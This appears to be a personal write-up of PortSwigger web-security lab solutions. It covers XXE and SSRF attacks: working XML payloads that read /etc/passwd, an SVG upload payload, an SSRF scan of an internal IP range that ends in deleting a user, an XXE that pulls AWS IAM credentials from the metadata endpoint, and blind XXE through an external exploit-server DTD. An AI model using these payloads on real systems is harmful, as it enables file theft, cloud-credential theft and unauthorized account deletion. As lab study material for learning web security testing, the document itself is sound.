![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bea19cde-df45-4d6b-b19b-06d086208fb1)**Exploiting XXE using external entities to retrieve files**

Checking stock shows a XML request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/753acbc2-680e-44d7-95cb-e91df779991a)


Our payload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c7b0dd2f-b900-4f9f-b3a9-a26c41022c5e)

**Basic SSRF against another back-end system**

Found url on stockAPI parameter 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3034330b-0663-4bee-8dd8-bd868eda7dac)


Look for admin interface on the IP address 
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fadmin
Replace final octet of ip address with parameter
Run Intruder sniper with number parameter 
1-255
200 request on 193
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9e0cc306-b3b8-46be-b5f3-da0825f2c932)




Send to repeater notice delete url on response 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9da64779-5aff-41cf-afba-ed937b930cc6)



Delete the user
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a4e8583f-1217-4cca-ad68-9b637ef5b6d2)

Replace without payload 

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

This will return our access key when we get the 400 request

**Exploiting XXE to perform SSRF attacks(Cloud AWS attack)**

Replace without payload 

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

This will return our access key when we get the 400 request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e8092414-b261-45a9-9a63-07f52c3aeed4)

**Exploiting blind XXE to retrieve data via error messages**

Trigger and error to reveal /etc/passwd 


Our exploit server DTD file
```
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil;
```

From <https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages> 


Intercept the stockcheck parameter
```
Add the following to the stockcheck parameter
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a51000b042dba3a8440537c01c0009e.exploit-server.net/exploit"> %xxe;]>
```

We now read file via error
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2dd6f1f9-d662-4686-a08a-af7520f09b87)



**Exploiting XInclude to retrieve files**

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

From <https://portswigger.net/web-security/xxe/lab-xinclude-attack> 



Replaced and put into our parameter
```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

We get file read
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c505cdf4-d7c1-4cbc-85b3-c816c25114ed)




```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

From <https://portswigger.net/web-security/xxe/lab-xinclude-attack> 



Replaced and put into our parameter
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1

We get file read
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5ce020d9-221a-45d3-9233-f2ea3f621ae2)


**Exploiting XXE via image file upload**

SVG payload to get hostname 

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

Save as svg file and upload
Output is given in image 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/22cbd373-dc78-4712-9489-2265e0a977fb)


**Exploiting XXE to retrieve data by repurposing a local DTD**



1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite. 
2. Insert the following parameter entity definition in between the XML declaration and the stockCheck element: 
3. <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]> This will import the Yelp DTD, then redefine the ISOamso entity, triggering an error message containing the contents of the /etc/passwd file. 

From <https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd>




 Request shows xml


Exploit payload

```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

We got file disclosure
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/13e0acd5-f46c-4c49-8c68-c27f3e2712b3)









































